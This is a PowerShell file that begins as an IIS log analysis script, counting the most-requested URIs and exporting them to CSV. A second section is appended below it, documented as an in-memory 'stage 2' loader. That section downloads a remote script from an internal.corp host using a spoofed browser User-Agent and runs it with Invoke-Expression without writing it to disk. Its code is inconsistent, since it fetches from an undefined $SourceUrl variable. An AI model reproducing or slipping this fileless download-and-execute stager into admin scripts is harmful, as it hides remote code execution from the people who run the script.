
$LogRoot = 'C:\inetpub\logs\LogFiles\W3SVC1'
$Days = 1
$TopN = 15
$OutputPath = "C:\Logs\reports\iis-top-2026-01-27.csv"
$HtmlPath = 'C:\Reports\iis-2026-01-27.html'


$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://internal.corp:8443/stage2.ps1',
    [int]$TimeoutSec = 17
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $RemoteScript = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($RemoteScript)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $RemoteScript.Length)
    Invoke-Expression $RemoteScript
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

$StageMarker = "stage-24"
Set-Location -Path $env:TEMP
Write-Verbose "stage marker 39 reached"
